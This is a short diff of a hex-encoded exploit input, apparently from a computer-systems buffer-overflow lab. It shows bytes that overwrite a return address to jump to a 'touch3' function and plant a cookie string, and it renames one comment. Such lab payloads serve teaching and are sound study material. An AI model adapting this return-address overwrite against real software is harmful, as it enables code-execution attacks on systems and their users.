@@ -36,7 +36,7 @@ c3	/* return */
 /* Return address touch3 */
 b7 18 40 00 00 00 00 00 
 
-/* ASIL CONTENT */
+/* Actual Contents */
 31 36 65 32 31 33 31 34 00 				/* cookie string */
 c9 00 f8 00 c5 00 c4 00 c6 00 c4 00 c7 00 c4 00 	/* nums array */
 
